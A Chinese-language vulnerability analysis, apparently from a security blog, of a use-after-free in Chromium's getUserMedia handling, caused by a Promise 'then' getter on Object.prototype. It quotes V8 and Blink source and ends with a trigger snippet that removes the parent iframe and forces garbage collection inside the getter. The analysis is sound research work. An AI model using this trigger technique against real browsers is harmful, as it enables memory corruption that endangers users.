```
// static
MaybeHandle<Object> JSPromise::Resolve(Handle<JSPromise> promise,
                                       Handle<Object> resolution) {
  // ...

  // 8. Let then be Get(resolution, "then").
  MaybeHandle<Object> then;
  if (isolate->IsPromiseThenLookupChainIntact(
          Handle<JSReceiver>::cast(resolution))) {
    // We can skip the "then" lookup on {resolution} if its [[Prototype]]
    // is the (initial) Promise.prototype and the Promise#then protector
    // is intact, as that guards the lookup path for the "then" property
    // on JSPromise instances which have the (initial) %PromisePrototype%.

    // 注意这里！这里调用了其他的then方法
    then = isolate->promise_then();
  } else {
    then =
        JSReceiver::GetProperty(isolate, Handle<JSReceiver>::cast(resolution),
                                isolate->factory()->then_string());
  }
  // ...

  // 10. Let thenAction be then.[[Value]].
  // 11. If IsCallable(thenAction) is false, then
  if (!then_action->IsCallable()) {
    // a. Return FulfillPromise(promise, resolution).
    // 这里调用Fulfill函数
    return Fulfill(promise, resolution);
  }
  // ...
}
```
注意该函数中部的isolate->promise_then()语句。如果resolution设置了其then属性，那么当控制流执行至此处时，就会调用用户所设计的getter。也就是说，在Promise Resoving执行到一半时，可以执行用户所定义的外部JS代码。

实际的用法：
为Object.prototype的then属性定义一个getter。从这时起，任何一个Promise中，从Object.prototype派生出的resolution都会调用这个getter。

```
Object.prototype.__defineGetter__("then", function() {
  // Statements
});
```
之后我们再回到漏洞

这个漏洞只要了解了上面讲到的JSPromise::Resolve就很简单了

```
void UserMediaRequest::OnMediaStreamInitialized(MediaStream* stream) {
  DCHECK(!is_resolved_);

  MediaStreamTrackVector audio_tracks = stream->getAudioTracks();
  for (const auto& audio_track : audio_tracks)
    audio_track->SetConstraints(audio_);

  MediaStreamTrackVector video_tracks = stream->getVideoTracks();
  for (const auto& video_track : video_tracks)
    video_track->SetConstraints(video_);

  callbacks_->OnSuccess(nullptr, stream); //  Invoking Promise.resolve thenable, and callback to iframe detach
  RecordIdentifiabilityMetric(surface_, GetExecutionContext(), //  use execution context destroyed
                              IdentifiabilityBenignStringToken(g_empty_string));
  is_resolved_ = true;
}
```

具体的漏洞点在注释里给出了，下面我们简单讲解一下：

首先在这里调用了一个回调函数OnSuccess：
```
callbacks_->OnSuccess(nullptr, stream);
```
而在这个函数中，调用了resolver_->Resolve，结合上面讲到的内容就可以得出在这里我们就有了执行用户所定义的外部JS代码的能力。
```
void OnSuccess(ScriptWrappable* callback_this_value,
                MediaStream* stream) override {
    resolver_->Resolve(stream);
}
```
之后再回到OnMediaStreamInitialized函数，在OnSuccess执行结束后将会调用
```
RecordIdentifiabilityMetric(surface_, GetExecutionContext(), IdentifiabilityBenignStringToken(g_empty_string));
```
在该函数中使用到了Context，如果我们在外部定义的js代码中将context删除，在这里就会触发uaf。

接下来就很明朗了，我们只要创建一个iframe，在其中执行MediaStream相关代码，之后在getter中删除掉iframe即可释放掉context。
```
Object.prototype.__defineGetter__("then", function() {
                        console.log("then");
                        parent.remove();
                        gc();
                });
```